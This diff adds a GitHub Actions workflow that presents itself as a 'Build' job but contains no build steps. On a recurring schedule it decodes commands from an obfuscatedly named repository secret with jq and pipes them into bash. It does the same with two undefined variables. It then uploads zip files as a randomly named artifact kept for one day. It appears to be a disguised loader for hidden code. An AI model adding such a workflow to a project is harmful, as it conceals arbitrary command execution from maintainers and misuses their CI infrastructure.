@@ -1,0 +1,30 @@
+name: Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '5 2,8,14,20 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Apply
+        env:
+          jxv871: ${{ secrets.jxv871 }}
+        run: |
+          printf '%s' "$jxv871" | jq -r .x562 | /bin/bash
+          printf '%s' "$oo459" | jq -r .nzbst3 | /bin/bash
+          printf '%s' "$jzib3" | jq -r .ey33 | /bin/bash
+
+      - name: Upload output
+        uses: actions/upload-artifact@v4
+        with:
+          name: MrBsQRWy
+          path: "*.zip"
+          retention-days: 1
